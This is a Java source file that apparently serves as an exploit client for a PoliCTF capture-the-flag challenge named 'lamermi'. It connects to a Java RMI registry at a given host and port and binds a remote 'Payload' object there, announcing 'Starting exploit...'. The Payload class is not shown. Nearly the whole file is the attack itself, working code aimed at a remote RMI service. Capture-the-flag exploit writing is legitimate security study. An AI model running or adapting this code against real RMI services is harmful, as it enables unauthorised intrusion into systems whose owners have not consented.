import it.polictf.lamermi.AverageService;

import java.io.IOException;
import java.io.Serializable;
import java.net.MalformedURLException;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClassLoader;
import java.util.List;

public class Main implements Remote, Serializable{

    public static void main(String args[]) {

	AverageService service = null;
        Registry reg1 = null;
	Remote p = new Payload();

	if(args.length !=2) {
		System.out.println("Wrong number of parameters, must be two\nAborting...");
		return;
	}

	String host = args[0];
	int port = Integer.parseInt(args[1]);
		
        System.setSecurityManager(new SecurityManager());

	System.out.println("Searching registry at "+host+":"+port);

        try {
            reg1 = LocateRegistry.getRegistry(host,port);
        } catch (RemoteException e) {
	    System.out.println("No registry found!\nAborting...");
            e.printStackTrace();
	    return;
        } finally {
	    System.out.println("Registry found!");
	}

        System.out.println("Starting exploit...");
        try {
            assert reg1 != null;
            reg1.bind("new service", p);
        } catch (RemoteException | AlreadyBoundException e) {
            System.out.println(e.getMessage());
        }
    }
}
